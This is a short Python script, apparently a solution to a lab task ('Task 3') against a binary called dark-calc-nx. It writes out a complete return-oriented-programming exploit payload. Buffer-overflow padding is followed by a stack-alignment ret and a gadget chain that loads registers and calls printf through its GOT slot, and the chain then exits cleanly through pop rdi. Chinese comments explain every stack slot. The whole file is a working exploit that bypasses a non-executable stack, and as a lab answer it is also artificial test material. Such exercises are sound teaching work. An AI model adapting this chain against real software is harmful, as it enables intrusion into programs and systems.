#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx."""
import struct
import sys


def qword(value):
    return struct.pack("<Q", value)


RET = 0x401636          # 单独的 ret，用于 16 字节栈对齐
POP_GADGET = 0x401a2a   # pop rbx/rbp/r12/r13/r14/r15; ret
CALL_GADGET = 0x401a10  # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]
POP_RDI = 0x401a33      # pop rdi; ret（藏在 pop r15 的 41 5f c3 内部）
PRINTF_GOT = 0x602038   # printf 的 GOT 槽
EXIT_PLT = 0x4016e0
FORMAT_STRING = 0x401ac0

payload = b"A" * 24

# 对齐滑板：多消耗一个栈槽，使进入 printf 时 rsp % 16 == 8
payload += qword(RET)

# 装填六个寄存器
payload += qword(POP_GADGET)
payload += qword(0)                 # rbx
payload += qword(1)                 # rbp = rbx+1，保证 call 返回后不循环
payload += qword(PRINTF_GOT)        # r12：call [r12+rbx*8] 读到 printf
payload += qword(FORMAT_STRING)     # r13 -> edi：格式串地址
payload += qword(0x41)              # r14 -> rsi：字符 'A'
payload += qword(0)                 # r15 -> rdx：本任务未使用

# 发射调用
payload += qword(CALL_GADGET)

# call 返回后：add rsp,8 跳过一个槽，再 pop 六个寄存器
payload += qword(0)                 # 被 add rsp,8 跳过
payload += qword(0)                 # pop rbx
payload += qword(0)                 # pop rbp
payload += qword(0)                 # pop r12
payload += qword(0)                 # pop r13
payload += qword(0)                 # pop r14
payload += qword(0)                 # pop r15

# 干净退出：pop rdi; ret -> rdi=0 -> exit(0)
payload += qword(POP_RDI)
payload += qword(0)
payload += qword(EXIT_PLT)

sys.stdout.buffer.write(payload)
